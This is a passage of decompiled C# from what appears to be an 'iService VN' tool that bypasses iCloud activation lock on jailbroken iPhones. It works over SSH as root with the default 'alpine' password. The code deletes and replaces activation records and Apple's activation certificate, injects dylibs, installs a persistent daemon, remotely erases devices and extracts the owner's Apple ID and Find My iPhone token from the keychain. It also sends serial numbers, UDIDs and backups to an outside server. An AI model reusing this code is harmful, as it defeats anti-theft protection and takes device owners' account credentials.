		httpWebRequest.UserAgent = "AssetCache/233 CFNetwork/1121.1.2 Darwin/19.3.0 (x86_64)";
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string contents = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		File.WriteAllText(MdmWorkingDirectory + DeviceStateRecovered.DeviceUDID + "\\Info.plist", contents);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void WriteMdmManifestPlist()
	{
		string requestUriString = ResolveMdmManifestEndpoint();
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(requestUriString);
		string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		string deviceProductType = DeviceStateRecovered.DeviceProductType;
		string deviceProductVersion = DeviceStateRecovered.DeviceProductVersion;
		string unpopulatedMetadata = DeviceStateRecovered.UnpopulatedMetadata5;
		string unpopulatedMetadata2 = DeviceStateRecovered.UnpopulatedMetadata6;
		string text = "thing1=" + Uri.EscapeDataString((deviceSerialNumber != null) ? (deviceSerialNumber ?? "") : "");
		text = text + "&thing2=" + Uri.EscapeDataString((deviceUDID != null) ? (deviceUDID ?? "") : "");
		text = text + "&thing3=" + Uri.EscapeDataString((deviceProductType != null) ? (deviceProductType ?? "") : "");
		text = text + "&thing4=" + Uri.EscapeDataString((deviceProductVersion != null) ? (deviceProductVersion ?? "") : "");
		text = text + "&thing5=" + Uri.EscapeDataString((unpopulatedMetadata != null) ? (unpopulatedMetadata ?? "") : "");
		text = text + "&thing6=" + Uri.EscapeDataString((unpopulatedMetadata2 != null) ? (unpopulatedMetadata2 ?? "") : "");
		byte[] bytes = Encoding.ASCII.GetBytes(text);
		httpWebRequest.ProtocolVersion = HttpVersion.Version11;
		httpWebRequest.Accept = "/";
		httpWebRequest.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-us");
		string text2 = "REDACTED_VENDOR_CREDENTIAL";
		string text3 = "REDACTED_VENDOR_CREDENTIAL";
		string text4 = Convert.ToBase64String(Encoding.ASCII.GetBytes(text2 + ":" + text3));
		httpWebRequest.Headers.Add("Authorization", "Basic " + text4);
		httpWebRequest.UserAgent = "AssetCache/233 CFNetwork/1121.1.2 Darwin/19.3.0 (x86_64)";
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string contents = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		File.WriteAllText(MdmWorkingDirectory + DeviceStateRecovered.DeviceUDID + "\\Manifest.plist", contents);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_006c_Name()
	{
		try
		{
			Recovered_04_0063_Name = 1;
			try
			{
				Recovered_06_00c1_Name();
				EnsureDevicePairing();
				UpdateProgress(1);
				ConnectSshOverUsb();
				UpdateProgress(2);
				MountDeviceFilesystem();
				UpdateProgress(3);
				ExecuteSshCommand("rm -rf /Library/MobileSubstrate/DynamicLibraries/");
				ExecuteSshCommand("rm -rf /Library/Frameworks/CydiaSubstrate.framework");
				ExecuteSshCommand("rm /Library/MobileSubstrate/MobileSubstrate.dylib");
				ExecuteSshCommand("rm /Library/MobileSubstrate/DynamicLibraries");
				ExecuteSshCommand("rm /Library/MobileSubstrate/ServerPlugins");
				ExecuteSshCommand("rm /usr/bin/cycc");
				ExecuteSshCommand("rm /usr/bin/cynject");
				ExecuteSshCommand("rm /usr/include/substrate.h");
				ExecuteSshCommand("rm /usr/lib/cycript0.9/com/saurik/substrate/MS.cy");
				ExecuteSshCommand("rm -rf /usr/lib/substrate");
				ExecuteSshCommand("rm /usr/lib/libsubstrate.dylib");
				ExecuteSshCommand("rm /usr/libexec/substrate");
				ExecuteSshCommand("rm /usr/libexec/substrated");
				UpdateProgress(8);
				string text = "";
				SshCommand sshCommand = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
				text = sshCommand.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
				UpdateProgress(10);
				ExecuteSshCommand("chflags nouchg " + text + "Library/internal/data_ark.plist");
				ExecuteSshCommand("chflags nouchg " + text + "Library/activation_records/activation_record.plist");
				ExecuteSshCommand("chflags nouchg /var/mobile/Library/Preferences/com.apple.purplebuddy.plist");
				ExecuteSshCommand("chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chflags nouchg /var/root/Library/Lockdown/data_ark.plist");
				ExecuteSshCommand("rm " + text + "Library/internal/data_ark.plist");
				ExecuteSshCommand("rm " + text + "Library/activation_records/activation_record.plist");
				ExecuteSshCommand("rm /var/mobile/Library/Preferences/com.apple.purplebuddy.plist");
				ExecuteSshCommand("rm /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("rm /var/root/Library/Lockdown/data_ark.plist");
				ExecuteSshCommand("launchctl unload -F /System/Library/LaunchDaemons/*");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/*");
				UpdateProgress(15);
				EnsureDevicePairing();
				ExecuteSshCommand("rm -r /System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				UpdateProgress(18);
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/raptor", "/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem");
				ExecuteSshCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs");
				UpdateProgress(20);
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/uikit.tar", "/uikit.tar");
				ExecuteSshCommand("cd / && tar -xvf uikit.tar && chmod 755 /usr/bin/*");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/9A", "/tmp/boot.tar.lzma");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/BC", "/sbin/lzma");
				ExecuteSshCommand("chmod 755 /sbin/lzma");
				ExecuteSshCommand("lzma -d -v /tmp/boot.tar.lzma");
				ExecuteSshCommand("tar -C / -xvf /tmp/boot.tar && rm -r /tmp/boot.tar");
				ExecuteSshCommand("chmod 755 /usr/libexec/substrate && /usr/libexec/substrate");
				ExecuteSshCommand("chmod 755 /usr/libexec/substrated && /usr/libexec/substrated");
				ExecuteSshCommand("killall -9 backboardd");
				UpdateProgress(30);
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/12", "/Library/MobileSubstrate/DynamicLibraries/untethered.dylib");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/34", "/Library/MobileSubstrate/DynamicLibraries/untethered.plist");
				ExecuteSshCommand("chmod +x /Library/MobileSubstrate/DynamicLibraries/untethered.dylib");
				ExecuteSshCommand("killall -9 SpringBoard mobileactivationd");
				Recovered_06_006d_Name();
				UpdateProgress(50);
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/activation_record.plist", "/var/mobile/Media/Downloads/activation_record.plist");
				ExecuteSshCommand("chflags nouchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/com.apple.commcenter.device_specific_nobackup.plist", "/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chflags uchg /var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist");
				ExecuteSshCommand("chmod -R 755 /var/containers/Data/System");
				string text2 = "";
				SshCommand sshCommand2 = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
				text2 = sshCommand2.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
				UpdateProgress(60);
				ExecuteSshCommand("mkdir -p " + text2 + "Library/activation_records");
				ExecuteSshCommand("cp -r /var/mobile/Media/Downloads/activation_record.plist " + text2 + "Library/activation_records/activation_record.plist");
				ExecuteSshCommand("launchctl unload /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
				ExecuteSshCommand("launchctl load /System/Library/LaunchDaemons/com.apple.mobileactivationd.plist");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/56", "/Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib");
				Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/78", "/Library/MobileSubstrate/DynamicLibraries/iuntethered.plist");
				UpdateProgress(70);
				ExecuteSshCommand("chmod +x /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib");
				ExecuteSshCommand("rm -r /Library/MobileSubstrate/DynamicLibraries/untethered.dylib");
				ExecuteSshCommand("rm -r /Library/MobileSubstrate/DynamicLibraries/untethered.plist");
				ExecuteSshCommand("rm -r /Library/MobileSubstrate/DynamicLibraries/iuntethered.dylib");
				ExecuteSshCommand("rm -r /Library/MobileSubstrate/DynamicLibraries/iuntethered.plist");
				ExecuteSshCommand("rm -r /var/mobile/Library/Logs/mobileactivationd");
				Recovered_06_009e_Name();
				UpdateProgress(75);
				Recovered_06_0088_Name();
				UpdateProgress(80);
				Recovered_06_008a_Name();
				UpdateProgress(85);
				Recovered_06_008c_Name();
				UpdateProgress(90);
				Recovered_06_008d_Name();
				UpdateProgress(92);
				Recovered_06_008e_Name();
				UpdateProgress(94);
				ExecuteSshCommand("launchctl unload -F -w /System/Library/LaunchDaemons/com.apple.CommCenter.plist");
				UpdateProgress(96);
				Recovered_06_00a5_Name();
				UpdateProgress(98);
				Recovered_06_008f_Name();
				UpdateProgress(100);
			}
			catch (Exception ex)
			{
				Recovered_06_006e_Name(ex);
				return;
			}
			Recovered_02_0010_TypeName recovered_02_0010_TypeName = new Recovered_02_0010_TypeName();
			recovered_02_0010_TypeName.ShowDialog();
		}
		catch (Exception ex2)
		{
			Recovered_06_006e_Name(ex2);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_006d_Name()
	{
		ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
		HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create("http://iservicevn.com/tmgsm/activebb.php");
		string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
		string deviceUDID = DeviceStateRecovered.DeviceUDID;
		string deviceProductType = DeviceStateRecovered.DeviceProductType;
		string text = "thing1=" + Uri.EscapeDataString((deviceSerialNumber != null) ? (deviceSerialNumber ?? "") : "");
		text = text + "&thing2=" + Uri.EscapeDataString((deviceUDID != null) ? (deviceUDID ?? "") : "");
		text = text + "&thing3=" + Uri.EscapeDataString((deviceProductType != null) ? (deviceProductType ?? "") : "");
		byte[] bytes = Encoding.ASCII.GetBytes(text);
		httpWebRequest.ProtocolVersion = HttpVersion.Version11;
		httpWebRequest.Accept = "/";
		httpWebRequest.Headers.Add(HttpRequestHeader.AcceptLanguage, "en-us");
		string text2 = "REDACTED_VENDOR_CREDENTIAL";
		string text3 = "REDACTED_VENDOR_CREDENTIAL";
		string text4 = Convert.ToBase64String(Encoding.ASCII.GetBytes(text2 + ":" + text3));
		httpWebRequest.Headers.Add("Authorization", "Basic " + text4);
		httpWebRequest.UserAgent = "AssetCache/233 CFNetwork/1121.1.2 Darwin/19.3.0 (x86_64)";
		httpWebRequest.Method = "POST";
		httpWebRequest.ContentType = "application/x-www-form-urlencoded";
		httpWebRequest.ContentLength = bytes.Length;
		using (Stream stream = httpWebRequest.GetRequestStream())
		{
			stream.Write(bytes, 0, bytes.Length);
		}
		HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
		string contents = new StreamReader(httpWebResponse.GetResponseStream()).ReadToEnd();
		File.WriteAllText(Recovered_04_0052_Name + "/vendor/utils/activation_record.plist", contents);
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_006e_Name(Exception P_0 = null)
	{
		string text = "Activation error!";
		if (P_0 != null)
		{
			text = P_0.Message + P_0.StackTrace;
		}
		string text2 = "\n Please Jailbreak your iDevice and Try Again !";
		try
		{
		}
		catch
		{
		}
		MessageBox.Show(text2, "iService VN!");
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_006f_Name(Exception P_0 = null)
	{
		string text = "Activation error!";
		if (P_0 != null)
		{
			text = P_0.Message + P_0.StackTrace;
		}
		string text2 = "\n Please Fresh Restore your iDevice and Try Again !";
		try
		{
		}
		catch
		{
		}
		MessageBox.Show(text2, "iService VN!");
	}

	private void Recovered_06_0070_Name(Exception P_0 = null)
	{
		Recovered_02_0013_TypeName recovered_02_0013_TypeName = new Recovered_02_0013_TypeName();
		recovered_02_0013_TypeName.ShowDialog();
	}

	private string Recovered_06_0071_Name()
	{
		throw new NotImplementedException();
	}

	private void Recovered_06_0072_Name()
	{
		throw new NotImplementedException();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0073_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			ConnectSshOverUsb();
			MountDeviceFilesystem();
			string deviceSerialNumber = DeviceStateRecovered.DeviceSerialNumber;
			string text = "http://iservicevn.com/idvbackup/" + deviceSerialNumber + ".tgz";
			if (Recovered_06_00c9_Name(text))
			{
				MessageBox.Show("iDevice Already Backup on Server", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				return;
			}
			Directory.CreateDirectory(Recovered_04_0055_Name + deviceSerialNumber);
			Directory.CreateDirectory(Recovered_04_0055_Name + deviceSerialNumber + "/FairPlay/");
			Directory.CreateDirectory(Recovered_04_0055_Name + deviceSerialNumber + "/Lockdown/");
			string text2 = "";
			SshCommand sshCommand = ExecuteSshCommand("find /private/var/containers/Data/System/ -iname 'internal'");
			text2 = sshCommand.Result.Replace("Library/internal", "").Replace("\n", "").Replace("//", "/");
			Recovered_04_0043_Name.Download(text2 + "Library/internal/data_ark.plist", new FileInfo(Recovered_04_0055_Name + deviceSerialNumber + "/data_ark.plist"));
			Recovered_04_0043_Name.Download(text2 + "Library/activation_records/activation_record.plist", new FileInfo(Recovered_04_0055_Name + deviceSerialNumber + "/activation_record.plist"));
			Recovered_04_0043_Name.Download("/private/var/mobile/Library/FairPlay", new DirectoryInfo(Recovered_04_0055_Name + deviceSerialNumber + "/FairPlay/"));
			Recovered_04_0043_Name.Download("/var/root/Library/Lockdown", new DirectoryInfo(Recovered_04_0055_Name + deviceSerialNumber + "/Lockdown/"));
			Recovered_04_0043_Name.Download("/private/var/wireless/Library/Preferences/com.apple.commcenter.device_specific_nobackup.plist", new FileInfo(Recovered_04_0055_Name + deviceSerialNumber + "/com.apple.commcenter.device_specific_nobackup.plist"));
			Recovered_04_0043_Name.Download("/var/mobile/Library/Preferences/com.apple.purplebuddy.plist", new FileInfo(Recovered_04_0055_Name + deviceSerialNumber + "/com.apple.purplebuddy.plist"));
			Recovered_04_0043_Name.Download("/System/Library/PrivateFrameworks/MobileActivation.framework/Support/Certificates/RaptorActivation.pem", new FileInfo(Recovered_04_0055_Name + deviceSerialNumber + "/RaptorActivation.pem"));
			string text3 = deviceSerialNumber + ".tgz";
			string text4 = Recovered_04_0054_Name + "/Backup/" + deviceSerialNumber + ".tgz";
			string text5 = Recovered_04_0055_Name + deviceSerialNumber;
			Recovered_06_00ba_Name(text5, text4, text3);
			if (Directory.Exists(Recovered_04_0055_Name))
			{
				Directory.Delete(Recovered_04_0055_Name, recursive: true);
			}
			Recovered_06_0099_Name();
			Recovered_06_00c8_Name();
			Recovered_06_00c1_Name();
		}
		catch (Exception)
		{
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0074_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			UpdateProgress(10);
			if (MessageBox.Show("Are you Sure want Erase All Data?", "Warning !!!", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				ConnectSshOverUsb();
				UpdateProgress(20);
				MountDeviceFilesystem();
				UpdateProgress(30);
				Recovered_06_007c_Name();
				UpdateProgress(40);
				ExecuteSshCommand("snappy -f / -r orig-fs -x");
				UpdateProgress(50);
				ExecuteSshCommand("launchctl load -w /System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
				UpdateProgress(60);
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000a_Name, "/usr/bin/eraser");
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_0007_Name, "/bin/eraser");
				UpdateProgress(70);
				ExecuteSshCommand("chmod -R 755 /usr/bin/eraser");
				ExecuteSshCommand("chmod -R 755 /bin/eraser");
				UpdateProgress(90);
				if (MessageBox.Show("Your iDevice now is being Restore, OK?", "Warning !!!", MessageBoxButtons.YesNo) == DialogResult.Yes)
				{
					ExecuteSshCommand("eraser -command da7e6b6d2c20eb316c093 & rm /usr/bin/eraser");
					ExecuteSshCommand("eraser -command 8a5fbd968b4f16624ecb5713744028fefabe8a20de10dfc58c4ede37212ac3da & rm /bin/eraser");
					UpdateProgress(100);
					MessageBox.Show("Your iDevice Successfully Erasing... !", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
				else
				{
					UpdateProgress(100);
					MessageBox.Show("Process Cancelled by User", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
				}
			}
			else
			{
				UpdateProgress(100);
				MessageBox.Show("Process Cancelled by User", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Please Re Open Tool and Click Erase Again!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0075_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			UpdateProgress(10);
			if (MessageBox.Show("Are you Sure want Erase Keep Same iOS?\nFor A11 CPU iOS 14.x Passcode/Disabled ONLY!", "Warning !!!", MessageBoxButtons.YesNo) == DialogResult.Yes)
			{
				ConnectSshOverUsb();
				UpdateProgress(20);
				Recovered_06_00b2_Name();
				UpdateProgress(30);
				ExecuteSshCommand("snappy -f / -r orig-fs -x");
				UpdateProgress(40);
				ExecuteSshCommand("launchctl unload -F /System/Library/LaunchDaemons/*");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.CommCenterRootHelper.plist");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.CommCenterMobileHelper.plist");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.mobile.obliteration.plist");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.devicedataresetd.plist");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.backboardd.plist");
				ExecuteSshCommand("launchctl load -w -F /System/Library/LaunchDaemons/com.apple.runningboardd.plist");
				MountDeviceFilesystem();
				UpdateProgress(50);
				UploadResourceViaScp(ApplicationResourcesRecovered.Recovered_17_000a_Name, "/usr/bin/eraser");
				UpdateProgress(60);
				ExecuteSshCommand("chmod -R 755 /usr/bin/eraser");
				ExecuteSshCommand("/usr/bin/eraser -command da7e6b6d2c20eb316c093 & rm /usr/bin/eraser");
				UpdateProgress(70);
				ExecuteSshCommand("killall -9 SpringBoard mobileactivationd");
				UpdateProgress(80);
				Recovered_06_00b2_Name();
				UpdateProgress(90);
				ExecuteSshCommand("/usr/bin/eraser -command da7e6b6d2c20eb316c093 && rm /usr/bin/eraser");
				UpdateProgress(100);
				MessageBox.Show("Your iDevice Successfully Erasing... !\nIf stuck, Manually Reboot, Erasing will Continue...", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
			else
			{
				UpdateProgress(100);
				MessageBox.Show("Process Cancelled by User", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
			}
		}
		catch (Exception)
		{
			MessageBox.Show("Please Re Open Tool and Click Erase Again!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0076_Name()
	{
		ConnectSshOverUsb();
		UpdateProgress(2);
		try
		{
			ExecuteSshCommand("mount -uw -o union /dev/disk0s1s1").Execute();
			UpdateProgress(5);
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/chflags", "/usr/bin/chflags");
			UpdateProgress(10);
			ExecuteSshCommand("chmod 755 chflags").Execute();
			UpdateProgress(15);
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/include/libap.c", "/tmp/aplsud1");
			UpdateProgress(20);
			ExecuteSshCommand("chmod +x /tmp/aplsud1").Execute();
			UpdateProgress(25);
			ExecuteSshCommand("tmp/aplsud1").Execute();
			UpdateProgress(30);
			ExecuteSshCommand("chflags -R nouchg /private/var/mobile/Library/UserConfigurationProfiles").Execute();
			UpdateProgress(35);
			ExecuteSshCommand("chflags -R nouchg /usr/share/firmware/wifi").Execute();
			ExecuteSshCommand("rm /private/var/mobile/Library/UserConfigurationProfiles/EffectiveUserSettings.plist").Execute();
			ExecuteSshCommand("rm /private/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist").Execute();
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/include/libals.cpp", "/usr/libexec/aplsud");
			UpdateProgress(40);
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/E.bin", "/u.bin");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/include/settings.h", "/private/var/mobile/Library/UserConfigurationProfiles/EffectiveUserSettings.plist");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/include/peus.h", "/private/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist");
			ExecuteSshCommand("chmod 755 /private/var/mobile/Library/UserConfigurationProfiles/EffectiveUserSettings.plist").Execute();
			UpdateProgress(45);
			ExecuteSshCommand("chmod 755 /private/var/mobile/Library/UserConfigurationProfiles/PublicInfo/PublicEffectiveUserSettings.plist").Execute();
			ExecuteSshCommand("chflags -R uchg /private/var/mobile/Library/UserConfigurationProfiles").Execute();
			ExecuteSshCommand("snappy -f / -r `snappy -f / -l | sed -n 2p` -t orig-fs").Execute();
			ExecuteSshCommand("tar -xvf /u.bin  -C /./").Execute();
			UpdateProgress(50);
			ExecuteSshCommand("cd /./ && chmod 777 ./usr/lib/libhistory.8.dylib ./usr/lib/libncurses.6.dylib ./usr/lib/libreadline.8.dylib ./sbin/launchctl ./bin/bash").Execute();
			ExecuteSshCommand("rm /u.bin").Execute();
			ExecuteSshCommand("rm -rf /private/etc/rc.d").Execute();
			ExecuteSshCommand("mkdir -p /private/etc/rc.d").Execute();
			UpdateProgress(60);
			ExecuteSshCommand("echo '#!/bin/bash' &>/private/etc/rc.d/substrate; echo '/sbin/launchctl load -w /./Library/LaunchDaemons/com.apple.aplsud.plist' >>/private/etc/rc.d/substrate; chmod +x /private/etc/rc.d/substrate").Execute();
			ExecuteSshCommand("chmod 777 /usr/libexec/aplsud").Execute();
			ExecuteSshCommand("rm -rf /tmp/aplsud1").Execute();
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/include/cpap.h", "/./Library/LaunchDaemons/com.apple.aplsud.plist");
			string contents = "@echo off\nvendor\\idevice_id.exe -l | vendor\\openssl.exe base64 -d | vendor\\openssl.exe base64 -A | vendor\\openssl.exe enc -aes-256-ecb -K 3731333437343337373732313741323534333241343632443441363134453634 | vendor\\openssl.exe base64 -A | vendor\\openssl.exe enc -aes-256-ecb -K 3731333437343337373732313741323534333241343632443441363134453634 | vendor\\openssl.exe base64 -A";
			File.WriteAllText(Recovered_04_0054_Name + "/utils/hash.cmd", contents);
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				FileName = Recovered_04_0054_Name + "/utils/hash.cmd",
				UseShellExecute = false,
				RedirectStandardOutput = true,
				CreateNoWindow = true
			};
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			string contents2 = standardOutput.ReadToEnd();
			process.WaitForExit();
			UpdateProgress(70);
			File.WriteAllText(Recovered_04_0054_Name + "/utils/hash.dll", contents2);
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/hash.dll", "/usr/share/firmware/wifi/DefaulPlatform.plist");
			UpdateProgress(80);
			ExecuteSshCommand("chflags uchg /usr/share/firmware/wifi/DefaulPlatform.plist").Execute();
			UpdateProgress(90);
			ExecuteSshCommand("/private/etc/rc.d/substrate").Execute();
			UpdateProgress(100);
			MessageBox.Show("Congratulations! iDevice Successfully USB Patched! \nNow You Can use Checkra1n 0.12.4 Jailbreak without USB Restricted!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
		catch (Exception)
		{
			MessageBox.Show("Please Re Open Tool and Click USB Patch Again!", "iService VN", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0077_Name()
	{
		try
		{
			Recovered_06_00c1_Name();
			UpdateProgress(10);
			ConnectSshOverUsb();
			UpdateProgress(20);
			MountDeviceFilesystem();
			UpdateProgress(30);
			string text = Recovered_06_0083_Name();
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/lib.tar.gz", "/usr/libexec/lib.tar.gz");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/jlutil", "/usr/libexec/jlutil");
			Recovered_06_00b3_Name(Recovered_04_0054_Name + "/utils/mv", "/usr/libexec/imd");
			UpdateProgress(40);
			ExecuteSshCommand("chmod 777 /usr/libexec/lib.tar.gz");
			ExecuteSshCommand("chmod 777 /usr/libexec/jlutil");
			ExecuteSshCommand("chmod 777 /usr/libexec/imd");
			ExecuteSshCommand("cd /usr/libexec && tar -xf /usr/libexec/lib.tar.gz");
			UpdateProgress(50);
			Recovered_06_0078_Name();
			UpdateProgress(60);
			Recovered_06_007a_Name();
			UpdateProgress(70);
			UpdateProgress(100);
			MessageBox.Show("Serial: " + text + "\n\n Account: " + Recovered_04_005c_Name + "\n Phone Number: " + Recovered_04_005b_Name, "Apple ID & Phone Number", MessageBoxButtons.OKCancel, MessageBoxIcon.Asterisk);
		}
		catch (Exception)
		{
			MessageBox.Show("Can Not Read Informations from iDevice", "Informations Not Found!", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_0078_Name()
	{
		SshCommand sshCommand = ExecuteSshCommand("/usr/libexec/jlutil /private/var/wireless/Library/Preferences/com.apple.commcenter.plist");
		Recovered_04_0059_Name = sshCommand.Result;
		File.WriteAllText(Recovered_04_0054_Name + "/utils/numb.dll", Recovered_04_0059_Name);
		char[] separator = new char[1] { '\n' };
		string[] array = Recovered_04_0059_Name.Split(separator);
		foreach (string text in array)
		{
			string text2 = text.Replace("   ", "");
			if (text2.StartsWith("mdn: "))
			{
				Recovered_04_005b_Name = Recovered_04_005b_Name + text2.Replace("mdn: ", "") + Environment.NewLine;
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void Recovered_06_0079_Name()
	{
		SshCommand sshCommand = ExecuteSshCommand("/usr/libexec/jlutil /var/mobile/Library/Preferences/com.apple.icloud.findmydeviced.FMIPAccounts.plist");
		Recovered_04_0059_Name = sshCommand.Result;
		char[] separator = new char[1] { '\n' };
		string[] array = Recovered_04_0059_Name.Split(separator);
		foreach (string text in array)
		{
			string text2 = text.Replace("   ", "");
			if (text2.StartsWith("dsid: "))
			{
				Recovered_04_005a_Name = text2.Replace("dsid: ", "");
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private bool Recovered_06_007a_Name()
	{
		SshCommand sshCommand = ExecuteSshCommand("cd /usr/libexec && tar -xf /usr/libexec/lib.tar.gz  && /usr/libexec/kawabonza -f 'com.apple.account.DeviceLocator.find-my-iphone-app-token'");
		string[] array = sshCommand.Result.Split('\n');
		Recovered_04_005c_Name = "";
		Recovered_04_005d_Name = "";
		string[] array2 = array;
		foreach (string text in array2)
		{
			string text2 = text.Replace("\r", "");
			if (text2.Contains("\"Account\""))
			{
				Recovered_04_005c_Name = text2.Split(new string[1] { "\" : \"" }, StringSplitOptions.None)[1].Replace("\"", "").Replace(",", "");
			}
			if (text2.Contains("\"Data\""))
			{
				Recovered_04_005d_Name = text2.Split(new string[1] { "\" : \"" }, StringSplitOptions.None)[1].Replace("\"", "").Replace(",", "");
			}
		}
		if (!(Recovered_04_005c_Name == "") && !(Recovered_04_005d_Name == ""))
		{
			return true;
		}
		MessageBox.Show("Token is not found", "Error", MessageBoxButtons.OK, MessageBoxIcon.Hand);
		return false;
	}

	private void Recovered_06_007b_Name(string P_0)
	{
		throw new NotImplementedException();
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	public void Recovered_06_007c_Name()
	{
		SshClient sshClient = new SshClient("127.0.0.1", "root", "alpine");
		try
		{
			if (!sshClient.IsConnected)
			{
				sshClient.Connect();
			}
			sshClient.CreateCommand("cp /private/preboot/active /./").Execute();
			sshClient.CreateCommand("mount -o rw,union,update /private/preboot").Execute();
